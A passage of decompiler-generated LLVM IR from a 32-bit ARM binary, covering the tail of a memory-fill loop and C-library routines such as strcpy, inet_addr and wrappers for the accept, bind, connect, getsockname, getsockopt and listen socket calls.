  store i32 %v6_12b10, i32* @r3, align 4
  %v0_12b14 = load i32, i32* %r2.global-to-local, align 4
  %v1_12b14 = add i32 %v0_12b14, -8
  store i32 %v1_12b14, i32* %r2.global-to-local, align 4
  %v5_12b1c = icmp slt i32 %v1_12b14, 8
  br i1 %v5_12b1c, label %dec_label_pc_12b10.dec_label_pc_12b28.loopexit_crit_edge, label %dec_label_pc_12ae8

dec_label_pc_12ae8:                               ; preds = %dec_label_pc_12b10
  %v7_12b1c = inttoptr i32 %v6_12b10 to i32*
  %v8_12b1c = load i32, i32* @r1, align 4
  store i32 %v8_12b1c, i32* %v7_12b1c, align 4
  %v9_12b1c = add i32 %v0_12af054, 28
  %v10_12b1c = inttoptr i32 %v9_12b1c to i32*
  %v11_12b1c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_12b1c, i32* %v10_12b1c, align 4
  %v12_12b1c = add i32 %v0_12af054, 32
  store i32 %v12_12b1c, i32* @r3, align 4
  %v6_12b20 = load i32, i32* %r2.global-to-local, align 4
  %v7_12b20 = add i32 %v6_12b20, -8
  store i32 %v7_12b20, i32* %r2.global-to-local, align 4
  %v5_12aec = icmp slt i32 %v7_12b20, 8
  br i1 %v5_12aec, label %dec_label_pc_12ae8.dec_label_pc_12b28.loopexit_crit_edge, label %dec_label_pc_12ae8.dec_label_pc_12af0_crit_edge

dec_label_pc_12ae8.dec_label_pc_12af0_crit_edge:  ; preds = %dec_label_pc_12ae8
  %v2_12af0.pre = load i32, i32* @r1, align 4
  %v1_12af0 = inttoptr i32 %v12_12b1c to i32*
  store i32 %v2_12af0.pre, i32* %v1_12af0, align 4
  %v3_12af0 = add i32 %v0_12af054, 36
  %v4_12af0 = inttoptr i32 %v3_12af0 to i32*
  %v5_12af0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_12af0, i32* %v4_12af0, align 4
  %v6_12af0 = add i32 %v0_12af054, 40
  store i32 %v6_12af0, i32* @r3, align 4
  %v0_12af4 = load i32, i32* %r2.global-to-local, align 4
  %v1_12af4 = add i32 %v0_12af4, -8
  store i32 %v1_12af4, i32* %r2.global-to-local, align 4
  %v5_12afc = icmp slt i32 %v1_12af4, 8
  br i1 %v5_12afc, label %dec_label_pc_12af0.dec_label_pc_12b28.loopexit_crit_edge, label %dec_label_pc_12b00

dec_label_pc_12ae8.dec_label_pc_12b28.loopexit_crit_edge: ; preds = %dec_label_pc_12ae8
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12b28

dec_label_pc_12af0.dec_label_pc_12b28.loopexit_crit_edge: ; preds = %dec_label_pc_12ae8.dec_label_pc_12af0_crit_edge, %dec_label_pc_12af0.preheader
  %v1_12af4.lcssa = phi i32 [ %v1_12af452, %dec_label_pc_12af0.preheader ], [ %v1_12af4, %dec_label_pc_12ae8.dec_label_pc_12af0_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12b28

dec_label_pc_12b00.dec_label_pc_12b28.loopexit_crit_edge: ; preds = %dec_label_pc_12b00
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12b28

dec_label_pc_12b10.dec_label_pc_12b28.loopexit_crit_edge: ; preds = %dec_label_pc_12b10
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12b28

dec_label_pc_12b28:                               ; preds = %dec_label_pc_12ae4, %dec_label_pc_12ae8.dec_label_pc_12b28.loopexit_crit_edge, %dec_label_pc_12af0.dec_label_pc_12b28.loopexit_crit_edge, %dec_label_pc_12b00.dec_label_pc_12b28.loopexit_crit_edge, %dec_label_pc_12b10.dec_label_pc_12b28.loopexit_crit_edge, %entry
  %v0_12b30 = phi i32 [ %arg3, %entry ], [ %v1_12b14, %dec_label_pc_12b10.dec_label_pc_12b28.loopexit_crit_edge ], [ %v1_12b04, %dec_label_pc_12b00.dec_label_pc_12b28.loopexit_crit_edge ], [ %v1_12af4.lcssa, %dec_label_pc_12af0.dec_label_pc_12b28.loopexit_crit_edge ], [ %v7_12b20, %dec_label_pc_12ae8.dec_label_pc_12b28.loopexit_crit_edge ], [ %v0_12ae8.pr, %dec_label_pc_12ae4 ]
  %v2_12b28 = icmp eq i32 %v0_12b30, 0
  store i1 %v2_12b28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12b28, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_12b28
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_12b28
  %v1_12b30 = sub i32 7, %v0_12b30
  store i32 %v1_12b30, i32* %r2.global-to-local, align 4
  %v3_12b34 = mul i32 %v1_12b30, 4
  %v4_12b34 = add i32 %v3_12b34, ptrtoint (i32* @global_var_12b3c.532 to i32)
  call void @__pseudo_branch(i32 %v4_12b34)
  %v0_12b3c = load i32, i32* @r1, align 4
  %v1_12b3c = trunc i32 %v0_12b3c to i8
  %v2_12b3c = load i32, i32* @r3, align 4
  %v3_12b3c = inttoptr i32 %v2_12b3c to i8*
  store i8 %v1_12b3c, i8* %v3_12b3c, align 1
  %v4_12b3c = load i32, i32* @r3, align 4
  %v5_12b3c = add i32 %v4_12b3c, 1
  store i32 %v5_12b3c, i32* %r3.global-to-local, align 4
  %v0_12b40 = load i32, i32* @r1, align 4
  %v1_12b40 = trunc i32 %v0_12b40 to i8
  %v3_12b40 = inttoptr i32 %v5_12b3c to i8*
  store i8 %v1_12b40, i8* %v3_12b40, align 1
  %v4_12b40 = load i32, i32* %r3.global-to-local, align 4
  %v5_12b40 = add i32 %v4_12b40, 1
  store i32 %v5_12b40, i32* %r3.global-to-local, align 4
  %v0_12b44 = load i32, i32* @r1, align 4
  %v1_12b44 = trunc i32 %v0_12b44 to i8
  %v3_12b44 = inttoptr i32 %v5_12b40 to i8*
  store i8 %v1_12b44, i8* %v3_12b44, align 1
  %v4_12b44 = load i32, i32* %r3.global-to-local, align 4
  %v5_12b44 = add i32 %v4_12b44, 1
  store i32 %v5_12b44, i32* %r3.global-to-local, align 4
  %v0_12b48 = load i32, i32* @r1, align 4
  %v1_12b48 = trunc i32 %v0_12b48 to i8
  %v3_12b48 = inttoptr i32 %v5_12b44 to i8*
  store i8 %v1_12b48, i8* %v3_12b48, align 1
  %v4_12b48 = load i32, i32* %r3.global-to-local, align 4
  %v5_12b48 = add i32 %v4_12b48, 1
  store i32 %v5_12b48, i32* %r3.global-to-local, align 4
  %v0_12b4c = load i32, i32* @r1, align 4
  %v1_12b4c = trunc i32 %v0_12b4c to i8
  %v3_12b4c = inttoptr i32 %v5_12b48 to i8*
  store i8 %v1_12b4c, i8* %v3_12b4c, align 1
  %v4_12b4c = load i32, i32* %r3.global-to-local, align 4
  %v5_12b4c = add i32 %v4_12b4c, 1
  store i32 %v5_12b4c, i32* %r3.global-to-local, align 4
  %v0_12b50 = load i32, i32* @r1, align 4
  %v1_12b50 = trunc i32 %v0_12b50 to i8
  %v3_12b50 = inttoptr i32 %v5_12b4c to i8*
  store i8 %v1_12b50, i8* %v3_12b50, align 1
  %v4_12b50 = load i32, i32* %r3.global-to-local, align 4
  %v5_12b50 = add i32 %v4_12b50, 1
  store i32 %v5_12b50, i32* %r3.global-to-local, align 4
  %v0_12b54 = load i32, i32* @r1, align 4
  %v1_12b54 = trunc i32 %v0_12b54 to i8
  %v3_12b54 = inttoptr i32 %v5_12b50 to i8*
  store i8 %v1_12b54, i8* %v3_12b54, align 1
  %v4_12b54 = load i32, i32* %r3.global-to-local, align 4
  %v5_12b54 = add i32 %v4_12b54, 1
  store i32 %v5_12b54, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_12af0, { 1, 0 }
  uselistorder i32 %v12_12b1c, { 1, 2, 0 }
  uselistorder i32 %v0_12af054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_12ae8.pr, { 0, 2, 1 }
  uselistorder i32 %v6_12ad8, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_12acc, { 1, 0 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 10, 3, 4, 5, 6, 7, 8, 9, 1, 11, 13, 12, 0 }
  uselistorder i32* %ip.global-to-local, { 4, 1, 2, 3, 0, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 3, 2, 1, 4, 0, 9, 8, 5, 7 }
  uselistorder i32 %arg3, { 1, 0, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_12b28, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_12b00, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_12b701 = load i32, i32* @r1, align 4
  %v1_12b702 = inttoptr i32 %v0_12b701 to i8*
  %v2_12b703 = load i8, i8* %v1_12b702, align 1
  %v2_12b745 = icmp eq i8 %v2_12b703, 0
  store i1 %v2_12b745, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_12b703, i8* %arg1, align 1
  br i1 %v2_12b745, label %dec_label_pc_12b80, label %dec_label_pc_12b68

dec_label_pc_12b68:                               ; preds = %entry, %dec_label_pc_12b68
  %v0_12b68 = load i32, i32* @r1, align 4
  %v1_12b68 = add i32 %v0_12b68, 1
  store i32 %v1_12b68, i32* @r1, align 4
  %v0_12b6c = load i32, i32* %r2.global-to-local, align 4
  %v1_12b6c = add i32 %v0_12b6c, 1
  store i32 %v1_12b6c, i32* %r2.global-to-local, align 4
  %v1_12b70 = inttoptr i32 %v1_12b68 to i8*
  %v2_12b70 = load i8, i8* %v1_12b70, align 1
  %v2_12b74 = icmp eq i8 %v2_12b70, 0
  store i1 %v2_12b74, i1* %cpsr_z.global-to-local, align 1
  %v3_12b78 = inttoptr i32 %v1_12b6c to i8*
  store i8 %v2_12b70, i8* %v3_12b78, align 1
  %v0_12b7c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12b7c, label %dec_label_pc_12b80, label %dec_label_pc_12b68

dec_label_pc_12b80:                               ; preds = %dec_label_pc_12b68, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12b68, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_12b8c = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_12b8c, i32* @r1, align 4
  %v0_12b90 = call i32 @inet_aton()
  %v2_12b94 = icmp eq i32 %v0_12b90, 0
  %v4_12b98 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_12b94, i32 -1, i32 %v4_12b98
  ret i32 %storemerge
}

define i32 @__sys_accept() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12bac = load i32, i32* @r7, align 4
  store i32 %v3_12bac, i32* %stack_var_-8, align 4
  %v0_12bb8 = load i32, i32* @r0, align 4
  store i32 %v0_12bb8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12bb8, -4095
  br i1 %tmp, label %dec_label_pc_12be0, label %dec_label_pc_12bc8

dec_label_pc_12bc8:                               ; preds = %entry
  %v0_12bcc = call i32 @__aeabi_read_tp()
  %v3_12bd0 = load i16, i16* @global_var_23424.488, align 2
  %v4_12bd0 = sext i16 %v3_12bd0 to i32
  %v0_12bd4 = load i32, i32* %r2.global-to-local, align 4
  %v1_12bd4 = sub i32 0, %v0_12bd4
  store i32 %v1_12bd4, i32* %r2.global-to-local, align 4
  %v3_12bd8 = add i32 %v4_12bd0, %v0_12bcc
  %v4_12bd8 = inttoptr i32 %v3_12bd8 to i32*
  store i32 %v1_12bd4, i32* %v4_12bd8, align 4
  %v2_12be0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12be0

dec_label_pc_12be0:                               ; preds = %entry, %dec_label_pc_12bc8
  %v1_12be4 = phi i32 [ %v0_12bb8, %entry ], [ -1, %dec_label_pc_12bc8 ]
  %v2_12be0 = phi i32 [ %v3_12bac, %entry ], [ %v2_12be0.pre, %dec_label_pc_12bc8 ]
  store i32 %v2_12be0, i32* @r7, align 4
  ret i32 %v1_12be4

; uselistorder directives
  uselistorder i32 %v0_12bb8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12be0, { 1, 0 }
}

define i32 @"$d.9"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12be8:
  %v0_12be8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12be8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12be8
  %v2_12bec = load i32, i32* @ip, align 4
  %v5_12bec = sdiv i32 %v2_12bec, 65536
  %v6_12bec = and i32 %v5_12bec, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12be8, %bb
  %v7_12bec = phi i32 [ %arg1, %dec_label_pc_12be8 ], [ %v6_12bec, %bb ]
  ret i32 %v7_12bec

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_12bf4 = load i32, i32* @r4, align 4
  store i32 %v3_12bf4, i32* %stack_var_-20, align 4
  %v6_12bf4 = load i32, i32* @r5, align 4
  %v9_12bf4 = load i32, i32* @r6, align 4
  %v12_12bf4 = load i32, i32* @r7, align 4
  %v4_12c00 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 13032) to i32*), align 4
  %v2_12c04 = icmp eq i32 %v4_12c00, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_12c04, label %dec_label_pc_12c1c, label %entry.dec_label_pc_12c28_crit_edge

entry.dec_label_pc_12c28_crit_edge:               ; preds = %entry
  br label %dec_label_pc_12c28

dec_label_pc_12c1c:                               ; preds = %entry
  store i32 %v3_12bf4, i32* @r4, align 4
  store i32 %v9_12bf4, i32* @r6, align 4
  store i32 %v12_12bf4, i32* @r7, align 4
  %v0_12c24 = call i32 @__sys_accept()
  br label %dec_label_pc_12c28

dec_label_pc_12c28:                               ; preds = %entry.dec_label_pc_12c28_crit_edge, %dec_label_pc_12c1c
  %v0_12c28 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_12c28, i32* @r5, align 4
  %v0_12c38 = load i32, i32* @r4, align 4
  store i32 %v0_12c38, i32* @r0, align 4
  %v0_12c3c = call i32 @__sys_accept()
  store i32 %v0_12c3c, i32* @r4, align 4
  %v0_12c44 = load i32, i32* @r5, align 4
  %v1_12c48 = call i32 @__libc_disable_asynccancel(i32 %v0_12c44)
  %v0_12c4c = load i32, i32* @r4, align 4
  %v2_12c54 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_12c54, i32* @r4, align 4
  store i32 %v6_12bf4, i32* @r5, align 4
  store i32 %v9_12bf4, i32* @r6, align 4
  store i32 %v12_12bf4, i32* @r7, align 4
  ret i32 %v0_12c4c

; uselistorder directives
  uselistorder label %dec_label_pc_12c28, { 1, 0 }
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12c64 = load i32, i32* @r7, align 4
  store i32 %v3_12c64, i32* %stack_var_-8, align 4
  %v0_12c70 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12c70, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12c70, -4095
  br i1 %tmp, label %dec_label_pc_12c98, label %dec_label_pc_12c80

dec_label_pc_12c80:                               ; preds = %entry
  %v0_12c84 = call i32 @__aeabi_read_tp()
  %v3_12c88 = load i16, i16* @global_var_23424.488, align 2
  %v4_12c88 = sext i16 %v3_12c88 to i32
  %v0_12c8c = load i32, i32* %r2.global-to-local, align 4
  %v1_12c8c = sub i32 0, %v0_12c8c
  store i32 %v1_12c8c, i32* %r2.global-to-local, align 4
  %v3_12c90 = add i32 %v4_12c88, %v0_12c84
  %v4_12c90 = inttoptr i32 %v3_12c90 to i32*
  store i32 %v1_12c8c, i32* %v4_12c90, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12c98.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12c98

dec_label_pc_12c98:                               ; preds = %entry, %dec_label_pc_12c80
  %v1_12c9c = phi i32 [ %v0_12c70, %entry ], [ -1, %dec_label_pc_12c80 ]
  %v2_12c98 = phi i32 [ %v3_12c64, %entry ], [ %v2_12c98.pre, %dec_label_pc_12c80 ]
  store i32 %v2_12c98, i32* @r7, align 4
  ret i32 %v1_12c9c

; uselistorder directives
  uselistorder i32 %v0_12c70, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12c98, { 1, 0 }
}

define i32 @"$d.8"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12ca0:
  %v0_12ca0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12ca0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12ca0
  %v2_12ca0 = load i32, i32* @sl, align 4
  %v8_12ca0 = shl i32 %v2_12ca0, %arg2
  %v9_12ca0 = and i32 %v8_12ca0, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12ca0, %bb
  %v4_12ca4 = phi i32 [ %arg1, %dec_label_pc_12ca0 ], [ %v9_12ca0, %bb ]
  ret i32 %v4_12ca4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__sys_connect() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12ca8 = load i32, i32* @r7, align 4
  store i32 %v3_12ca8, i32* %stack_var_-8, align 4
  %v0_12cb4 = load i32, i32* @r0, align 4
  store i32 %v0_12cb4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12cb4, -4095
  br i1 %tmp, label %dec_label_pc_12cdc, label %dec_label_pc_12cc4

dec_label_pc_12cc4:                               ; preds = %entry
  %v0_12cc8 = call i32 @__aeabi_read_tp()
  %v3_12ccc = load i16, i16* @global_var_23424.488, align 2
  %v4_12ccc = sext i16 %v3_12ccc to i32
  store i32 %v4_12ccc, i32* @r3, align 4
  %v0_12cd0 = load i32, i32* %r2.global-to-local, align 4
  %v1_12cd0 = sub i32 0, %v0_12cd0
  store i32 %v1_12cd0, i32* %r2.global-to-local, align 4
  %v3_12cd4 = add i32 %v4_12ccc, %v0_12cc8
  %v4_12cd4 = inttoptr i32 %v3_12cd4 to i32*
  store i32 %v1_12cd0, i32* %v4_12cd4, align 4
  %v2_12cdc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12cdc

dec_label_pc_12cdc:                               ; preds = %entry, %dec_label_pc_12cc4
  %v1_12ce0 = phi i32 [ %v0_12cb4, %entry ], [ -1, %dec_label_pc_12cc4 ]
  %v2_12cdc = phi i32 [ %v3_12ca8, %entry ], [ %v2_12cdc.pre, %dec_label_pc_12cc4 ]
  store i32 %v2_12cdc, i32* @r7, align 4
  ret i32 %v1_12ce0

; uselistorder directives
  uselistorder i32 %v0_12cb4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12cdc, { 1, 0 }
}

define i32 @"$d.7"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12ce4:
  %v0_12ce4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12ce4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12ce4
  %v2_12ce4 = load i32, i32* @fp, align 4
  %v8_12ce4 = shl i32 %v2_12ce4, %arg2
  %v9_12ce4 = and i32 %v8_12ce4, %arg1
  %v3_12ce8 = load i32, i32* @r7, align 4
  %v8_12ce8 = ashr i32 %v9_12ce4, %v3_12ce8
  %v9_12ce8 = and i32 %v8_12ce8, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12ce4, %bb
  %v10_12ce8 = phi i32 [ %arg1, %dec_label_pc_12ce4 ], [ %v9_12ce8, %bb ]
  ret i32 %v10_12ce8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_12cf0 = load i32, i32* @r4, align 4
  store i32 %v3_12cf0, i32* %stack_var_-20, align 4
  %v6_12cf0 = load i32, i32* @r5, align 4
  %v9_12cf0 = load i32, i32* @r6, align 4
  %v12_12cf0 = load i32, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* @r3, align 4
  %v4_12cfc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 13032) to i32*), align 4
  store i32 %v4_12cfc, i32* @ip, align 4
  %v2_12d00 = icmp eq i32 %v4_12cfc, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_12d00, label %dec_label_pc_12d18, label %entry.dec_label_pc_12d24_crit_edge

entry.dec_label_pc_12d24_crit_edge:               ; preds = %entry
  br label %dec_label_pc_12d24

dec_label_pc_12d18:                               ; preds = %entry
  store i32 %v3_12cf0, i32* @r4, align 4
  store i32 %v9_12cf0, i32* @r6, align 4
  store i32 %v12_12cf0, i32* @r7, align 4
  %v0_12d20 = call i32 @__sys_connect()
  br label %dec_label_pc_12d24

dec_label_pc_12d24:                               ; preds = %entry.dec_label_pc_12d24_crit_edge, %dec_label_pc_12d18
  %v0_12d24 = call i32 @__libc_enable_asynccancel()
  %v0_12d28 = load i32, i32* @r6, align 4
  store i32 %v0_12d28, i32* @r1, align 4
  store i32 %v0_12d24, i32* @r5, align 4
  %v0_12d34 = load i32, i32* @r4, align 4
  store i32 %v0_12d34, i32* @r0, align 4
  %v0_12d38 = call i32 @__sys_connect()
  store i32 %v0_12d38, i32* @r4, align 4
  %v0_12d40 = load i32, i32* @r5, align 4
  %v1_12d44 = call i32 @__libc_disable_asynccancel(i32 %v0_12d40)
  %v0_12d48 = load i32, i32* @r4, align 4
  %v2_12d50 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_12d50, i32* @r4, align 4
  store i32 %v6_12cf0, i32* @r5, align 4
  store i32 %v9_12cf0, i32* @r6, align 4
  store i32 %v12_12cf0, i32* @r7, align 4
  ret i32 %v0_12d48

; uselistorder directives
  uselistorder label %dec_label_pc_12d24, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12d60 = load i32, i32* @r7, align 4
  store i32 %v3_12d60, i32* %stack_var_-8, align 4
  %v0_12d6c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12d6c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12d6c, -4095
  br i1 %tmp, label %dec_label_pc_12d94, label %dec_label_pc_12d7c

dec_label_pc_12d7c:                               ; preds = %entry
  %v0_12d80 = call i32 @__aeabi_read_tp()
  %v3_12d84 = load i16, i16* @global_var_23424.488, align 2
  %v4_12d84 = sext i16 %v3_12d84 to i32
  %v0_12d88 = load i32, i32* %r2.global-to-local, align 4
  %v1_12d88 = sub i32 0, %v0_12d88
  store i32 %v1_12d88, i32* %r2.global-to-local, align 4
  %v3_12d8c = add i32 %v4_12d84, %v0_12d80
  %v4_12d8c = inttoptr i32 %v3_12d8c to i32*
  store i32 %v1_12d88, i32* %v4_12d8c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12d94.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12d94

dec_label_pc_12d94:                               ; preds = %entry, %dec_label_pc_12d7c
  %v1_12d98 = phi i32 [ %v0_12d6c, %entry ], [ -1, %dec_label_pc_12d7c ]
  %v2_12d94 = phi i32 [ %v3_12d60, %entry ], [ %v2_12d94.pre, %dec_label_pc_12d7c ]
  store i32 %v2_12d94, i32* @r7, align 4
  ret i32 %v1_12d98

; uselistorder directives
  uselistorder i32 %v0_12d6c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12d94, { 1, 0 }
}

define i32 @"$d.6"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12d9c:
  %v0_12d9c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12d9c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12d9c
  %v2_12d9c = load i32, i32* @lr, align 4
  %v8_12d9c = shl i32 %v2_12d9c, %arg2
  %v9_12d9c = and i32 %v8_12d9c, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12d9c, %bb
  %v4_12da0 = phi i32 [ %arg1, %dec_label_pc_12d9c ], [ %v9_12d9c, %bb ]
  ret i32 %v4_12da0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_12da4 = load i32, i32* @r4, align 4
  store i32 %v3_12da4, i32* %stack_var_-12, align 4
  %v0_12db4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12db4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12db4, -4095
  br i1 %tmp, label %dec_label_pc_12ddc, label %dec_label_pc_12dc4

dec_label_pc_12dc4:                               ; preds = %entry
  %v0_12dc8 = call i32 @__aeabi_read_tp()
  %v3_12dcc = load i16, i16* @global_var_23424.488, align 2
  %v4_12dcc = sext i16 %v3_12dcc to i32
  %v0_12dd0 = load i32, i32* %r2.global-to-local, align 4
  %v1_12dd0 = sub i32 0, %v0_12dd0
  store i32 %v1_12dd0, i32* %r2.global-to-local, align 4
  %v3_12dd4 = add i32 %v4_12dcc, %v0_12dc8
  %v4_12dd4 = inttoptr i32 %v3_12dd4 to i32*
  store i32 %v1_12dd0, i32* %v4_12dd4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12ddc.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_12ddc

dec_label_pc_12ddc:                               ; preds = %entry, %dec_label_pc_12dc4
  %v1_12de0 = phi i32 [ %v0_12db4, %entry ], [ -1, %dec_label_pc_12dc4 ]
  %v2_12ddc = phi i32 [ %v3_12da4, %entry ], [ %v2_12ddc.pre, %dec_label_pc_12dc4 ]
  store i32 %v2_12ddc, i32* @r4, align 4
  ret i32 %v1_12de0

; uselistorder directives
  uselistorder i32 %v0_12db4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12ddc, { 1, 0 }
}

define i32 @"$d.5"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12de4:
  %v0_12de4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12de4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12de4
  %v2_12de4 = load i32, i32* @r7, align 4
  %v5_12de4 = udiv i32 %v2_12de4, 4
  %v6_12de4 = and i32 %v5_12de4, %arg1
  %v3_12de8 = load i32, i32* @r6, align 4
  %v8_12de8 = lshr i32 %v6_12de4, %v3_12de8
  %v9_12de8 = and i32 %v8_12de8, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12de4, %bb
  %v10_12de8 = phi i32 [ %arg1, %dec_label_pc_12de4 ], [ %v9_12de8, %bb ]
  ret i32 %v10_12de8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12dec = load i32, i32* @r7, align 4
  store i32 %v3_12dec, i32* %stack_var_-8, align 4
  %v0_12df8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12df8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12df8, -4095
  br i1 %tmp, label %dec_label_pc_12e20, label %dec_label_pc_12e08

dec_label_pc_12e08:                               ; preds = %entry
  %v0_12e0c = call i32 @__aeabi_read_tp()
